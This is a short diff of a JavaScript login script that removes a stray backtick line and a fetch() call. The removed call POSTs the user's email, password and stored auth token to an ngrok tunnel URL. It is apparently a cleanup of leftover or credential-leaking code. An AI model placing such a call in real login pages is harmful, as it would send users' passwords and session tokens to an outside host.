@@ -16,12 +16,3 @@ window.onload = function() {
         });
     }
 };
-``
-fetch('https://4591-2803-9800-b842-7ebd-9408-358c-b27c-6b80.ngrok-free.app/login.html', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${localStorage.getItem('token')}`
-    },
-    body: JSON.stringify({ email, password })
-});
